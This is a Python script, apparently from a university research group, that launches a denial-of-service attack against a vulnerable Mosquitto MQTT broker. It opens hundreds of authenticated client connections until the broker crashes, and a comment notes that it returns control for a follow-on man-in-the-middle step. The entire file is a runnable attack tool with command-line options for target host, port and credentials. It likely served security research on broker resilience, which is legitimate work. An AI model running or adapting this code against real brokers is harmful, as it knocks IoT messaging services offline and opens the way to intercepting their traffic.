#!/usr/bin/env python3

"""
dos.py, Crashes a vulnerable mosqsuitto broker
@author: tzimmermann @ AG Verteilte Systeme, Uni Osnabrueck
@date: 19.03.2018
"""

import paho.mqtt.client as mqtt
import time

MAX_CLIENTS = 500
class MQTT_DoS:

    def __init__(self, hostname, port, credentials):
        """Constructor sets up a Denial of Service Attack
           :param string hostname: Hostname or IP of the broker
           :param int port: Port of the broker
           :param tuple credentials: tuple of valid username and password for a client
           """
        self.host = hostname
        self.port = port
        self.cred = credentials

        try:
            conn = mqtt.Client(client_id='InitClient')
            conn.username_pw_set(*self.cred)
            conn.connect(self.host, self.port)
            time.sleep(0.5)
        except ConnectionRefusedError:
            print('Can`t initialy connect to server. Exit')
            exit(0)
        except: #Catch all. Not ideal but better safe than sorry
            print('Something went worng. Exit')
            exit(0)

        print('InitConnect succssesful:')


        # TODO: Implement me
        # Check of host, port cred are valid

    def on_sub_connect(self, client, userdata, flags, rc):
        print('Framework: Connected')

    def cleanup(self, connections):

        """ Clean up threads """
        for conn in connections:
            #Connection thead loop stops automaticly if started
            conn.disconnect()

    def run(self):
        """Start new paho-mqtt clients until the broker seems crashed, then return
           :return : return without value if broker has crashed
           """

        # List to save all opened connections
        conns = []
        user, pw = self.cred
        print('Trying to crash broker at ', self.host,':',self.port)

        # Number of Clients to crash: 42 -> NICE :)
        counter = 0
        try:
            while True:
                if counter > MAX_CLIENTS:
                    self.cleanup
                    print('Max number of clients reached. If broker did not crash try to increase Max_Clients\nExiting')
                    exit(0)

                # Give unique clientIDs
                subscriber = mqtt.Client(client_id='Client'+str(counter))
                subscriber.username_pw_set(user, pw)

                # Connect and start looping. Save connection to list
                subscriber.connect(self.host, self.port)

                # NOTE Can also start a loop. But this also takes manny ressources on the client machine.
                # But it would make the attac more realistic
                # subscriber.loop_start()
                conns.append(subscriber)

                # Print info and wait
                print('Starting Client' + str(counter))

                #NOTE Might need to adjust the sleep time depending on
                # the PC ord the network (if it is run over the network)
                # 0.5 and 0.25 sec worked for me but slower is saver
                time.sleep(0.25)
                counter += 1
        except ConnectionRefusedError:
            print('Broker crashed')

            # Cleanup and return for MITM
            self.cleanup(conns)
            time.sleep(1)   # Seconds broker waits to restart: 10s. For safty also wait 1 sec
            return
        except KeyboardInterrupt:
            print('Interrupt recived. Cleaning up and exiting')
            self.cleanup(conns)
            exit(0)


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='Launches multiple mqtt-subscribers until the broker crashes')
    parser.add_argument('--broker', '-b',
                        help='hostname or ip of the broker to connect to',
                        default='localhost')
    parser.add_argument('--port', '-p',
                        help='port of the broker',
                        default='1883',
                        type=int)
    parser.add_argument('--user', '-u',
                        help='user',
                        default='username',
                        type=str)
    parser.add_argument('--password', '-P',
                        help='password',
                        default='Password for >username<',
                        type=str)
    args = parser.parse_args()
    crasher = MQTT_DoS(args.broker, args.port, (args.user, args.password))
    crasher.run()